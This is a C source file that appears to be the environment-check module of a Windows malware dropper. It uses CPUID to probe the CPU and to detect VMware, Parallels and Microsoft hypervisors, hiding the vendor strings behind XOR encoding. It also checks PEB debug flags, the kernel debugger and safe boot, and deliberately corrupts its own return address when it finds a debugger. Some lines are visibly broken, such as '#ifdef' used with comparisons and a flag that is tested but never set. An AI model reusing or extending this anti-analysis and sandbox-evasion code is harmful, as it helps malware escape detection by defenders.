#include <config.h>

CONFIG Config = {
    RTLP_LCG_DWORD, // Features
    RTLP_LCG_DWORD, // Cpu
    RTLP_LCG_DWORD, // HyperVisor
    RTLP_LCG_DWORD, // NtVersion
    RTLP_LCG_DWORD, // NtVersion
    RTLP_LCG_DWORD, // NtVersion
    RTLP_LCG_DWORD, // NtVersion
    RTLP_LCG_DWORD, // NtVersion
    RTLP_LCG_DWORD  // Os
};

#if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF || SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
    static
    VOID
    FORCEINLINE
    TrashReturnValue(VOID)
    {
        *((PULONG_PTR)_AddressOfReturnAddress()) = (ULONG_PTR)RTLP_LCG_NATIVE;
    }
#endif

static
BOOL
FORCEINLINE
ConfigIsProcessorCompatible(VOID)
{
    $DLOG0(DLG_FLT_INFO, "Checking if processor is supported");

    enum {
        /* ECX */
        CPUID_00000001_HV     = (1 << 31),
        CPUID_00000001_SSE4_2 = (1 << 20),
        CPUID_00000001_SSE4_1 = (1 << 19),
        CPUID_00000001_SSE3   = (1 <<  0),

        /* EDX */
        CPUID_00000001_SSE2   = (1 << 26),
        CPUID_00000001_CMOV   = (1 << 15)
    };

    FLONG dwEdx;
    FLONG dwEcx;

    __asm {
        mov eax, 0x00000001
        cpuid
        mov dword ptr [dwEdx], edx
        mov dword ptr [dwEcx], ecx
    }

    /* Minimal support */
    {
        if (!(dwEdx & CPUID_00000001_CMOV)) {
            return FALSE;
        }

        if (!(dwEdx & CPUID_00000001_SSE2)) {
            return FALSE;
        }
    };

    /* CMOVcc instructions */
    Config.Features.bSSE3 = (dwEcx & CPUID_00000001_SSE3  ) ? TRUE : FALSE;
    Config.Features.bSSE4 = (dwEcx & CPUID_00000001_SSE4_1) ? TRUE : FALSE;
    Config.Features.bSSE5 = (dwEcx & CPUID_00000001_SSE4_2) ? TRUE : FALSE;
    Config.Features.bHV   = (dwEcx & CPUID_00000001_HV    ) ? TRUE : FALSE;

    #ifdef DEBUG_LEVEL >= DEBUG_LEVEL_INFORMATIVE
        if (Config.Features.bHV) {
            $DLOG1(DLG_FLT_WARNING, "HyperVisor is enabled!");
        }
    #endif

    /* EBX-EDX-ECX */
    M128I xwVendor      = _mm_setzero_si128();
    M128I xwVendorIntel = _mm_set_epi32(0, 'letn', 'Ieni', 'uneG'); // GenuineIntel
    M128I xwVendorAmd   = _mm_set_epi32(0, 'DMAc', 'itne', 'htuA'); // AuthenticAMD

    __asm {
        xor eax, eax
        cpuid
        mov dword ptr [0 + xwVendor], ebx
        mov dword ptr [4 + xwVendor], edx
        mov dword ptr [8 + xwVendor], ecx
    }

    $DLOG1(DLG_FLT_DEFAULT,
        "Vendor: \"%s\" (EBX:%08lX EDX:%08lX ECX:%08lX)",
        &xwVendor,
        xwVendor.m128i_u32[0], xwVendor.m128i_u32[1], xwVendor.m128i_u32[2]
    );

    Config.Cpu.bIntel      = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorIntel)) == 0xFFFF ? TRUE : FALSE;
    Config.Cpu.bAmd        = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorAmd))   == 0xFFFF ? TRUE : FALSE;
    Config.Cpu.bUnderWow64 = RtlpIsProcessRunningUnderWow64()                                      ? TRUE : FALSE;

    $DLOG2(DLG_FLT_DEFAULT, "Config.Cpu.bIntel      = %u", Config.Cpu.bIntel);
    $DLOG2(DLG_FLT_DEFAULT, "Config.Cpu.bAmd        = %u", Config.Cpu.bAmd);
    $DLOG2(DLG_FLT_DEFAULT, "Config.Cpu.bUnderWow64 = %u", Config.Cpu.bUnderWow64);

    $DLOG1(DLG_FLT_INFO, "Done");

    return TRUE;
}

static
BOOL
FORCEINLINE
ConfigIsHyperVisorSupported(VOID)
{
    $DLOG0(DLG_FLT_INFO, "Checking if hypervisor is supported");

    enum {
        CBC_XORKEY = RTLP_LCG_DWORD,
        CBC_FILLER = RTLP_LCG_DWORD
    };

    #define CBC_VENDOR(X1, X2, X3)                      \
        (CBC_FILLER ^ (X3 ^ (X2 ^ (X1 ^ CBC_XORKEY)))), \
        (              X3 ^ (X2 ^ (X1 ^ CBC_XORKEY))),  \
        (              X2 ^ (X1 ^       CBC_XORKEY)),   \
        (              X1 ^             CBC_XORKEY)

    if (!Config.Features.bHV) {
        $DLOG1(DLG_FLT_DEFAULT, "Not present");

        return TRUE;
    }

    #ifdef DEBUG_LEVEL >= DEBUG_LEVEL_INFORMATIVE
    {
        M128I $xwVendor = _mm_setzero_si128();

        __asm {
            mov eax, 0x40000000
            cpuid
            mov dword ptr [0 + $xwVendor], ebx
            mov dword ptr [4 + $xwVendor], ecx
            mov dword ptr [8 + $xwVendor], edx
        };

        $DLOG1(DLG_FLT_DEFAULT,
            "Vendor: \"%s\" (EBX:%08lX ECX:%08lX EDX:%08lX)",
            &$xwVendor,
            $xwVendor.m128i_u32[0], $xwVendor.m128i_u32[1], $xwVendor.m128i_u32[2]
        );
    }
    #endif

    /*
        EBX-ECX-EDX
    */
    M128I xwVendor          = _mm_setzero_si128();
    M128I xwVendorMicrosoft = _mm_set_epi32(CBC_VENDOR('rciM',         'foso',         'vH t'        )); // Microsoft Hv
    M128I xwVendorVmware    = _mm_set_epi32(CBC_VENDOR('awMV',         'MVer',         'eraw'        )); // VMwareVMware
    M128I xwVendorPadding   = _mm_set_epi32(CBC_VENDOR(RTLP_LCG_DWORD, RTLP_LCG_DWORD, RTLP_LCG_DWORD)); // Padding
    M128I xwVendorParallels = _mm_set_epi32(CBC_VENDOR(' lrp',         'epyh',         '  vr'        )); // prl hyperv  

    __asm {
        mov eax, 0x40000000
        cpuid
        mov eax, CBC_FILLER
        xor ebx, CBC_XORKEY
        xor ecx, ebx
        xor edx, ecx
        xor eax, edx
        mov dword ptr [ 0 + xwVendor], ebx
        mov dword ptr [ 4 + xwVendor], ecx
        mov dword ptr [ 8 + xwVendor], edx
        mov dword ptr [12 + xwVendor], eax
    };

    Config.HyperVisor.bMicrosoft = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorMicrosoft)) == 0xFFFF ? TRUE : FALSE;
    Config.HyperVisor.bVmware    = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorVmware   )) == 0xFFFF ? TRUE : FALSE;
    Config.HyperVisor.bPadding   = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorPadding  )) == 0xFFFF ? TRUE : FALSE;
    Config.HyperVisor.bParallels = _mm_movemask_epi8(_mm_cmpeq_epi32(xwVendor, xwVendorParallels)) == 0xFFFF ? TRUE : FALSE;

    $DLOG2(DLG_FLT_DEFAULT, "Config.HyperVisor.bMicrosoft = %u", Config.HyperVisor.bMicrosoft);
    $DLOG2(DLG_FLT_DEFAULT, "Config.HyperVisor.bVmware    = %u", Config.HyperVisor.bVmware);
    $DLOG2(DLG_FLT_DEFAULT, "Config.HyperVisor.bParallels = %u", Config.HyperVisor.bParallels);

    #ifdef DEBUG_LEVEL >= DEBUG_LEVEL_CASUAL
        if (Config.HyperVisor.bEnabled != 0x00000001) {
            $DLOG1(DLG_FLT_ERROR, "HyperVisor is not supported!");
        }
    #endif

    $DLOG1(DLG_FLT_INFO, "Done");

    #undef CBC_VENDOR

    #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
        if (Config.HyperVisor.bEnabled != 0x00000001) {
            TrashReturnValue();

            return FALSE;
        }
    #endif

    return TRUE;
}

static
BOOL
FORCEINLINE
ConfigIsNtVersionSupported(VOID)
{
    PPEB Peb = RtlpGetPeb32();
    Config.NtVersion.Major = (NTVERSION)Peb->OSMajorVersion;
    Config.NtVersion.Minor = (NTVERSION)Peb->OSMinorVersion;
    Config.NtVersion.Build = (NTVERSION)Peb->OSBuildNumber;

    $DLOG1(DLG_FLT_DEFAULT, "NT Version: %lu.%lu Build:%lu", Peb->OSMajorVersion, Peb->OSMinorVersion, Peb->OSBuildNumber);

    if (Config.NtVersion.Build < SCFG_NTVERSION_MIN_BNO) {
        return FALSE;
    }

    if (Config.NtVersion.Major > SCFG_NTVESRION_MAX_MJ) {
        return FALSE;
    }

    if (Config.NtVersion.Build > SCFG_NTVERSION_DEPRECATED_MI_BNO) {
        Config.NtVersion.bIsDeprecated = TRUE;

        $DLOG0(DLG_FLT_WARNING, "Running on deprecated version");
    } else {
        ULONG dwBuildNumbers[] = {
            0xFFFFFFFF,               // 0 ( Windows 7 SP1 and Windows 7 are the same)
            NTVERSION_WIN8_BNO,       // 1
            NTVERSION_WIN9_BNO,       // 2
            NTVERSION_WIN10_BNO,      // 3
            NTVERSION_WIN10_1511_BNO, // 4
            NTVERSION_WIN10_1607_BNO, // 5
            NTVERSION_WIN10_1703_BNO, // 6
            NTVERSION_WIN10_1709_BNO, // 7
            NTVERSION_WIN10_1803_BNO, // 8
            NTVERSION_WIN10_1809_BNO  // 9
        };

        for (ULONG_PTR i = 0; i != ARRAYSIZE(dwBuildNumbers); i++) {
            if (dwBuildNumbers[i] == Config.NtVersion.Build) {
                Config.NtVersion.dwCommonIndex = i;
            }
        }

        $DLOG2(DLG_FLT_DEFAULT, "Config.NtVersion.dwCommonIndex = %lu", Config.NtVersion.dwCommonIndex);
    }

    return TRUE;
}

//PRAGMA_OPTIMIZATION_LEVEL(2) // TODO:
static
BOOL
FORCEINLINE
ConfigIsWindowsSupported(VOID)
{
    enum {
        NtGlobalInvalidFlags = (
            FLG_KERNEL_STACK_TRACE_DB     |
            FLG_USER_STACK_TRACE_DB       |
            FLG_HEAP_VALIDATE_ALL         |
            FLG_HEAP_ENABLE_FREE_CHECK    |
            FLG_HEAP_VALIDATE_PARAMETERS  |
            FLG_ENABLE_KDEBUG_SYMBOL_LOAD |
            FLG_ENABLE_SYSTEM_CRIT_BREAKS |
            FLG_ENABLE_CSRDEBUG
        )
    };

    $DLOG0(DLG_FLT_INFO, "Checking if windows is supported");

    if (!ConfigIsNtVersionSupported()) {
        return FALSE;
    }

    BOOL bRval = TRUE;
    PTEB Teb = RtlpGetTeb();

    {
        PPEB Peb = (PVOID)Teb->ProcessEnvironmentBlock;

        if (Peb->BeingDebugged) {
            $DLOG1(DLG_FLT_CRITICAL, "Peb32.BeingDebugged is enabled!");

            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
                bRval = FALSE;
                TrashReturnValue();
            #endif
        }

        if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
            $DLOG1(DLG_FLT_CRITICAL, "Peb32.NtGlobalFlag contains unwanted debug flags");

            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
                bRval = FALSE;
                TrashReturnValue();
            #endif
        }
    }

    if (Config.Cpu.bUnderWow64) {
        PPEB64 Peb = RtlpGetPeb64();

        if (Peb->BeingDebugged) {
            $DLOG1(DLG_FLT_CRITICAL, "Peb64.BeingDebugged is enabled!");

            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
                bRval = FALSE;
                TrashReturnValue();
            #endif
        }

        if (Peb->NtGlobalFlag & NtGlobalInvalidFlags) {
            $DLOG1(DLG_FLT_CRITICAL, "Peb64.NtGlobalFlag contains unwanted debug flags");

            #if SCFG_DROPPER_IGNORE_SOFTWARE_DBG == OFF
                bRval = FALSE;
                TrashReturnValue();
            #endif
        }
    }
	
	PKUSER_SHARED_DATA UserShared = RtlpUserShared();

    if (UserShared->SafeBootMode) {
        $DLOG1(DLG_FLT_CRITICAL, "UserShared.SafeBootMode is enabled!");

        #if SCFG_DROPPER_IGNORE_SAFEBOOT == OFF
            bRval = FALSE;
        #endif
    }

    if (UserShared->KdDebuggerEnabled) {
        $DLOG1(DLG_FLT_CRITICAL, "UserShared.KdDebuggerEnabled is enabled!");

        #if SCFG_DROPPER_IGNORE_HARDWARE_DBG == OFF
            bRval = FALSE;
            TrashReturnValue();
        #endif
    }

    if (Config.Cpu.bUnderWow64) {
        Config.Os.wLongModeSelector   = *(PWORD )((ULONG_PTR)Teb->WOW32Reserved + 5);

        __asm {
            mov ax, cs
            mov word ptr [Config.Os.wLegacyModeSelector], ax
        };

        $DLOG1(DLG_FLT_DEFAULT, "Config.Os.wLongModeSelector   = 0x%04X", Config.Os.wLongModeSelector);
        $DLOG1(DLG_FLT_DEFAULT, "Config.Os.wLegacyModeSelector = 0x%04X", Config.Os.wLegacyModeSelector);
    }

    $DLOG1(DLG_FLT_INFO, "Done");

    #undef INVALID_NTGLOBALFLG

    return bRval;
}

BOOL
DECLSPEC_NOINLINE
InitConfig(VOID)
{
    RtlpZeroMemoryInstr(&Config, sizeof(Config));

    if (!ConfigIsProcessorCompatible()) {
        return FALSE;
    }

    if (!ConfigIsHyperVisorSupported()) {
        return FALSE;
    }

    if (!ConfigIsWindowsSupported()) {
        return FALSE;
    }

    return TRUE;
}

